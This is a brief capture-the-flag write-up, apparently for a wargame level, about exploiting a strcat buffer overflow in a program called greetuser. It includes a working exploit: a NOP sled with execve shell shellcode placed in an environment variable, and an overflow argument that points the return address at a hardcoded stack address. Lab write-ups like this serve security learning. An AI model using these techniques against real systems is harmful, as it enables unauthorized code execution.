# Level 6

Also a fairly basic overflow

Used same technique as level 5 w/ environment variable containing giant NOP sled and shellcode.

Buffer overflow happens because of `strcat(greeting, user.name);` where there's not a null terminating byte between user.name and user.password

Needed to set LANG=fr in order to extend the buffer overflow in `greetuser`, though I suspect that it still would've been possible with a fancy Stack pivot trick (because EBP was overrideable)

`
$ export NOP_AND_SHELLCODE=$(python -c "print '\x90' * 130000")$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
$ LANG=fr /levels/level06 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa $(python -c "print 'A' * 26 + '\x10\x0b\xfe\xbf'")`
